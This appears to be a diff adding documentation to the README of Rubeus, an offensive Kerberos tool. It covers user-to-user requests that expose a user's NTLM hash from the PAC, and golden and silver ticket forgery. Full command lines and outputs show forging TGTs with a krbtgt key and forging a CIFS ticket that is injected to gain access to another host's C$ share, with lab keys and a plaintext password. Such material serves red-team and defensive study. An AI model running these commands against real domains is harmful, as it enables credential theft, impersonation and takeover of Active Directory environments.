+          AgECoQ0wCxsFcm9hc3QbAm1l
+
+      ServiceName              :  roast/me
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  harmj0y
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  20/07/2021 00:02:27
+      EndTime                  :  20/07/2021 09:57:46
+      RenewTill                :  26/07/2021 23:57:46
+      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+      KeyType                  :  aes256_cts_hmac_sha1
+      Base64(key)              :  U9Vnk0QnOmByQqF7i+5ujkinm9pRrevcRhw1sKVEVi4=
+      Decrypted PAC            :
+        LogonInfo              :
+          LogonTime            : 19/07/2021 23:00:38
+          LogoffTime           :
+          KickOffTime          :
+          PasswordLastSet      : 14/07/2021 02:07:12
+          PasswordCanChange    : 15/07/2021 02:07:12
+          PasswordMustChange   :
+          EffectiveName        : harmj0y
+          FullName             : Harm J0y
+          LogonScript          :
+          ProfilePath          :
+          HomeDirectory        :
+          HomeDirectoryDrive   :
+          LogonCount           : 8
+          BadPasswordCount     : 0
+          UserId               : 1106
+          PrimaryGroupId       : 513
+          GroupCount           : 1
+          Groups               : 513
+          UserFlags            : (32) EXTRA_SIDS
+          UserSessionKey       : 0000000000000000
+          LogonServer          : PDC1
+          LogonDomainName      : RUBEUS
+          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039
+          UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+          ExtraSIDCount        : 1
+          ExtraSIDs            : S-1-18-1
+          ResourceGroupCount   : 0
+        CredentialInfo         :
+          Version              : 0
+          EncryptionType       : rc4_hmac
+          CredentialData    :   *** NO KEY ***
+        ClientName             :
+          Client Id            : 19/07/2021 23:57:46
+          Client Name          : harmj0y
+        UpnDns                 :
+          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL
+          UPN                  : harmj0y@rubeus.ghostpack.local
+          Flags                : 0
+        ServerChecksum         :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : 96FA020562EE73B38D31AEEF (VALID)
+        KDCChecksum            :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : E7FDCBAF5F580DFB567DF102 (UNVALIDATED)
+
+
+    [*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:
+
+    /user:harmj0y /id:1106 /pgid:513 /logoncount:8 /badpwdcount:0 /sid:S-1-5-21-3237111427-1607930709-3979055039 /netbios:RUBEUS /displayname:"Harm J0y" /groups:513 /sids:S-1-18-1 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1d /dc:PDC1.RUBEUS.GHOSTPACK.LOCAL /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+
+Using PKINIT to request a TGT and then requesting a user-to-user service ticket to gain access to the NTLM hash stored within the PAC (manually performing the `/getcredentials` flag to **asktgt**):
+
+    C:\Rubeus>Rubeus.exe asktgs /u2u /asrepkey:CC9D16AB01D1BD0EF9EBD53C8AD536D9 /ticket:doIF9DCCBfCgAwIBBaED...(snip)...ay5sb2NhbA== /tgs:doIF9DCCBfCgAwIBBaED...(snip)...ay5sb2NhbA==
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)
+    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+    [*] Building User-to-User TGS-REQ request for: 'harmj0y'
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFxTCCBcGgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          RVVTLkdIT1NUUEFDSy5MT0NBTKkUMBKgAwIBAaELMAkbB2hhcm1qMHk=
+
+      ServiceName              :  harmj0y
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  harmj0y
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  19/07/2021 23:01:05
+      EndTime                  :  20/07/2021 09:00:38
+      RenewTill                :  26/07/2021 23:00:38
+      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+      KeyType                  :  rc4_hmac
+      Base64(key)              :  Qm9zdwFIINSHAAmqaviuEw==
+      ASREP (key)              :  CC9D16AB01D1BD0EF9EBD53C8AD536D9
+      Decrypted PAC            :
+        LogonInfo              :
+          LogonTime            : 19/07/2021 22:59:21
+          LogoffTime           :
+          KickOffTime          :
+          PasswordLastSet      : 14/07/2021 02:07:12
+          PasswordCanChange    : 15/07/2021 02:07:12
+          PasswordMustChange   :
+          EffectiveName        : harmj0y
+          FullName             : Harm J0y
+          LogonScript          :
+          ProfilePath          :
+          HomeDirectory        :
+          HomeDirectoryDrive   :
+          LogonCount           : 7
+          BadPasswordCount     : 0
+          UserId               : 1106
+          PrimaryGroupId       : 513
+          GroupCount           : 1
+          Groups               : 513
+          UserFlags            : (32) EXTRA_SIDS
+          UserSessionKey       : 0000000000000000
+          LogonServer          : PDC1
+          LogonDomainName      : RUBEUS
+          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039
+          UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+          ExtraSIDCount        : 1
+          ExtraSIDs            : S-1-18-1
+          ResourceGroupCount   : 0
+        CredentialInfo         :
+          Version              : 0
+          EncryptionType       : rc4_hmac
+          CredentialData       :
+            CredentialCount    : 1
+              NTLM             : C69A7EA908898C23B72E65329AF7E3E8
+        ClientName             :
+          Client Id            : 19/07/2021 23:00:38
+          Client Name          : harmj0y
+        UpnDns                 :
+          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL
+          UPN                  : harmj0y@rubeus.ghostpack.local
+          Flags                : 0
+        ServerChecksum         :
+          Signature Type       : KERB_CHECKSUM_HMAC_MD5
+          Signature            : ADEC4A1A7DF70D0A61047E510E778454 (VALID)
+        KDCChecksum            :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : 6CF688E02147BEEC168E0125 (UNVALIDATED)
+
+**Note The `/asrepkey` from the TGT retrival must be passed to decrypted the CredentialData section where the NTLM hash is stored but the `/servicekey` argument is not required here as the session key from the TGT is being used because it is a user-to-user request.
 
 ### renew
 
@@ -862,6 +1197,615 @@ To forge an S4U2Self referral, only the trust key is required. By using the `/ta
 
 
 
+## Ticket Forgery
+
+Breakdown of the ticket forgery commands:
+
+| Command     | Description |
+| ----------- | ----------- |
+| [golden](#golden) | Forge an ticket granting ticket (TGT) |
+| [silver](#silver) | Forge a service ticket, can also forge TGTs |
+
+There are many similarities between the `golden` and `silver` commands, the reason for them being separate is to simplfy the `golden` command. Service tickets can be much more complex than TGTs with different keys and extra sections, while TGTs can be forged with the `silver` command, `golden` provides fewer potential arguments as the features not relevent to TGTs are not present.
+
+Most of the arguments for both of these commands are to set PAC fields and should be reasonably self explanitory. These are:
+
+| Argument | Description |
+|----------|-------------|
+| /user | Used as the user to query details for if `/ldap` is passed but also is used to set the EffectiveName field in the PAC and the cname field in the EncTicketPart |
+| /dc | Specifies the domain controller used for the LDAP query if `/ldap` is passed but also used to set the LogonServer field in the PAC |
+| /netbios | Sets the LogonDomainName field in the PAC |
+| /sid | Sets the LogonDomainId field in the PAC |
+| /id | Sets the UserId field in the PAC (Default: 500) |
+| /displayname | Sets the FullName field in the PAC |
+| /logoncount | Sets the LogonCount field in the PAC (Default: 0) |
+| /badpwdcount | Sets the BadPasswordCount field in the PAC (Default: 0) |
+| /uac | Sets the UAC field in the PAC (Default: NORMAL_ACCOUNT) |
+| /pgid | Sets the PrimaryGroupId field in the PAC and is also added to the `/groups` field (Default: 513) |
+| /groups | Comma separated. Sets the Groups field in the PAC, also has the `/pgid` added to it. The total is also used to calculate the GroupCount field (Default: 520,512,513,519,518) |
+| /homedir | Sets the HomeDirectory field in the PAC |
+| /homedrive | Sets the HomeDirectoryDrive field in the PAC |
+| /profilepath | Sets the ProfilePath field in the PAC |
+| /scriptpath | Sets the LogonScript field in the PAC |
+| /lastlogoff | Sets the LogoffTime field in the PAC. In local time format - Is converted to UTC automatically |
+| /lastlogon | Sets the LogonTime field in the PAC. In local time format - Is converted to UTC automatically (Default: starttime - 1 second) |
+| /passlastset | Sets the PasswordLastSet field in the PAC. In local time format - Is converted to UTC automatically |
+| /minpassage | Sets the PasswordCanChange field in the PAC. This is relative to PasswordLastSet, in number of days, so '5' for 5 days |
+| /maxpassage | Sets the PasswordMustChange field in the PAC. This is relative to PasswordLastSet, in number of days, so '5' for 5 days |
+| /sids | Comma separated. Sets the ExtraSIDs field in the PAC. It is also used to calculate the ExtraSIDCount field |
+| /resourcegroupsid | Sets the ResourceGroupSid field in the PAC. If used, `/resourcegroups` is also required |
+| /resourcegroups | Comma separated. Sets the ResourceGroups field in the PAC. It is also used to calculate the ResourceGroupCount field. If used, `/resourcegroupsid` is also required |
+
+Other arguments common to both commands but to set fields outside of the PAC are:
+
+| Argument | Description |
+|----------|-------------|
+| /authtime | Sets the authtime field in the EncTicketPart. In local time format - Is converted to UTC automatically (Default: now) |
+| /starttime | Sets the starttime field in the EncTicketPart. In local time format - Is converted to UTC automatically (Default: now) |
+| /endtime | Sets the endtime field in the EncTicketPart. This is relative to starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below (Default: 10h) |
+| /renewtill | Sets the renew-till field in the EncTicketPart. This is relative to starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below (Default: 7d) |
+| /rangeend | This is for creating multiple tickets that start at different times. This will be the last starttime, relative to `/starttime`, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
+| /rangeinterval | This is for creating multiple tickets that starts are different times. This is the interval that will be used between each starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
+| /flags | Sets the ticket flags within the EncTicketPart (Default: forwardable,renewable,pre_authent and for `golden` also initial) |
+
+For the relative times described in the tables above, the format is an integer used as a multiplier followed by a single character which acts as a timerange. The meaning of each supported character is shown in the table below (**These are case sensitive**):
+
+| Character | Description |
+|-----------|-------------|
+| m | Minutes |
+| h | Hours |
+| d | Days |
+| M | Months |
+| y | Years |
+
+The other common feature used by both commands is LDAP information retrieval. Both `golden` and `silver` support retrieving information over LDAP using the `/ldap` flag. The `/ldap` flag can be used with the `/creduser` and `credpassword` arguments to authenticate as an alternative user when retrieving this information. The inforamtion is retrieved by sending 3 LDAP queries and mounting the SYSVOL share of a domain controller (for reading the Domain policy file) if no other information is passed. LDAP queries will automatically be sent over TLS and fail back to plaintext LDAP if it fails.
+
+The first LDAP query, which will always be sent if `ldap` is passed, queries for the user specified in `/user`, and retreives most of the users information required for the PAC.
+
+The second LDAP query will be sent if `/groups`, `/pgid`, `/minpassage` **OR** `/maxpassage` are not given on the command line, any of these arguments given on the command line will avoid querying LDAP for the information. This query retrieves the groups that the user is a member of, including the primary group, along with the domain policy object (used to get the path to the policy file). If `/minpassage` or `/maxpassage` is not provided on the command line and the domain policy object is retrieved from LDAP, the SYSVOL share of a DC is mounted and the policy file is parsed to get the MinimumPasswordAge (to set the proper value for the PasswordCanChange field in the PAC) and the MaximumPasswordAge (to set the proper value for the PasswordMustChange field in the PAC) values.
+
+Lastly, if the `/netbios` argument is not given on the command line, an LDAP query for the proper netbios name of the domain is made from the *Configuration* container in order to set the LogonDomainName field in the PAC. If the `/ldap` flag is not given on the command line and the `/netbios` argument also is not given, the first element (before the first period '.') is uppercased and used instead.
+
+The `/printcmd` flag can be used to print the arguments required to generate another ticket containing the same PAC information used to generate the current ticket. This will **not** print arguments related to the times the ticket is valid for as those are likely required to be different for any future tickets you want to forge.
+
+### golden
+
+The **golden** action will forge a TGT for the user `/user:X` encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum and KDCChecksum. The various arguments to set fields manually are described above or the `/ldap` flag can be used to automatically retrieve the information from the domain controller.
+
+Forging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:
+
+    C:\Rubeus>Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGT
+
+    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=harmj0y)'
+    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+    [*] Attempting to mount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully mounted
+    [*] Attempting to unmount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully unmounted
+    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'
+    [*] Building PAC
+
+    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)
+    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039
+    [*] UserId         : 1106
+    [*] Groups         : 513
+    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] Service        : krbtgt
+    [*] Target         : rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 00:12:40
+    [*] StartTime      : 29/07/2021 00:12:40
+    [*] EndTime        : 29/07/2021 10:12:40
+    [*] RenewTill      : 05/08/2021 00:12:40
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+    
+    
+    
+    [*] Printing a command to recreate a ticket containing the information used within this ticket
+
+    C:\Rubeus\Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
+
+Forging a TGT, explicitly setting everything on the command line:
+
+    C:\Rubeus>Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGT
+
+    [*] Building PAC
+
+    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)
+    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039
+    [*] UserId         : 1106
+    [*] Groups         : 513
+    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] Service        : krbtgt
+    [*] Target         : rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 00:18:19
+    [*] StartTime      : 29/07/2021 00:18:19
+    [*] EndTime        : 29/07/2021 10:18:19
+    [*] RenewTill      : 05/08/2021 00:18:19
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+Forging 5 TGTs starting on different days with 1 day interval between starttimes, with the first starting now, and using LDAP to get the PAC information:
+
+    C:\Rubeus>Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /rangeend:5d /rangeinterval:1d
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGT
+
+    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=harmj0y)'
+    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+    [*] Attempting to mount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully mounted
+    [*] Attempting to unmount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully unmounted
+    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'
+    [*] Building PAC
+
+    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)
+    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039
+    [*] UserId         : 1106
+    [*] Groups         : 513
+    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] Service        : krbtgt
+    [*] Target         : rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 00:22:38
+    [*] StartTime      : 29/07/2021 00:22:38
+    [*] EndTime        : 29/07/2021 10:22:38
+    [*] RenewTill      : 05/08/2021 00:22:38
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 30/07/2021 00:22:38
+    [*] StartTime      : 30/07/2021 00:22:38
+    [*] EndTime        : 30/07/2021 10:22:38
+    [*] RenewTill      : 06/08/2021 00:22:38
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 31/07/2021 00:22:38
+    [*] StartTime      : 31/07/2021 00:22:38
+    [*] EndTime        : 31/07/2021 10:22:38
+    [*] RenewTill      : 07/08/2021 00:22:38
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 01/08/2021 00:22:38
+    [*] StartTime      : 01/08/2021 00:22:38
+    [*] EndTime        : 01/08/2021 10:22:38
+    [*] RenewTill      : 08/08/2021 00:22:38
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 02/08/2021 00:22:38
+    [*] StartTime      : 02/08/2021 00:22:38
+    [*] EndTime        : 02/08/2021 10:22:38
+    [*] RenewTill      : 09/08/2021 00:22:38
+
+    [*] base64(ticket.kirbi):
+
+          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs
+
+### silver
+
+The **silver** action will forge a ticket for the user `/user:X` and service `/service:SPN`, encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum. If the `/krbkey:X` argument is passed this will be used to create the KDCChecksum and TicketChecksum (if the service is not **krbtgt/domain.com** or **domain.com** is different to the from the realm used within the ticket, ie. it is a referral ticket), otherwise the same key used to encrypt the ticket is used. If `krbenctype:X` is not passed, the same encryption type used by the service key is assumed for the KDCChecksum and TicketChecksum.
+
+The `/cname:X` and `/crealm:X` arguments can be used to set different values for those fields within the EncTicketPart (encrypted part of the ticket), this is sometimes seen within referral delegation tickets. A S4UDelegationInfo PAC section can be added by passing the `/s4uproxytarget:X` and `/s4utransitedservices:SPN1,SPN2,...` arguments, this section provides a final target for delegation and the list of SPNs the delegation has happened through.
+
+The `/authdata` flag can be used to add some generic Authorization Data sections to the EncTicketPart, by default this will include a *KERB-LOCAL* section and a *KERB-AD-RESTRICTION-ENTRY* section with some default values.
+
+Forging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **ccob** using the services *RC4* password hash and signing the KDCChecksum and TicketChecksum with the proper KRBTGT *AES256* key, using LDAP with alternate credentials to get the PAC information:
+
+    C:\Rubeus>dir \\SQL1.rubeus.ghostpack.local\c$
+    The user name or password is incorrect.
+
+    C:\Rubeus>Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob /krbkey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /krbenctype:aes256 /domain:rubeus.ghostpack.local /ptt
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGS
+
+    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=ccob)'
+    [*] Retrieving group and domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(distinguishedname=CN=Domain Admins,CN=Users,DC=rubeus,DC=ghostpack,DC=local)(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+    [*] Attempting to mount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully mounted
+    [*] Attempting to unmount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully unmounted
+    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming rubeus.ghostpack.local is the forest root
+    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'
+    [*] Building PAC
+
+    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)
+    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039
+    [*] UserId         : 1109
+    [*] Groups         : 512,513
+    [*] ServiceKey     : F74B07EB77CAA52B8D227A113CB649A6
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+    [*] Service        : cifs
+    [*] Target         : SQL1.rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGS for 'ccob' to 'cifs/SQL1.rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 01:00:23
+    [*] StartTime      : 29/07/2021 01:00:23
+    [*] EndTime        : 29/07/2021 11:00:23
+    [*] RenewTill      : 05/08/2021 01:00:23
+
+    [*] base64(ticket.kirbi):
+
+          doIFZTCCBWGgAwIBBaEDAgEWooIESDCCBERhggRAMIIEPKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          bG9jYWw=
+
+
+    [+] Ticket successfully imported!
+
+    C:\Rubeus>dir \\SQL1.rubeus.ghostpack.local\c$
+     Volume in drive \\SQL1.rubeus.ghostpack.local\c$ has no label.
+     Volume Serial Number is 1AD6-20BE
+    
+     Directory of \\SQL1.rubeus.ghostpack.local\c$
+
+    15/09/2018  08:19    <DIR>          PerfLogs
+    20/07/2021  18:17    <DIR>          Program Files
+    20/07/2021  18:17    <DIR>          Program Files (x86)
+    21/07/2021  01:53    <DIR>          Rubeus
+    20/07/2021  21:02    <DIR>          temp
+    20/07/2021  22:31    <DIR>          Users
+    20/07/2021  18:18    <DIR>          Windows
+                   0 File(s)              0 bytes
+                   7 Dir(s)  124,275,159,040 bytes free
+
+Forging a referral TGT for a trusting domain, using LDAP to retrieve the PAC information:
+
+    C:\Rubeus>Rubeus.exe silver /user:exploitph /ldap /service:krbtgt/dev.rubeus.ghostpack.local /rc4:856a1023055848748e7b9d505ebe0e02
+
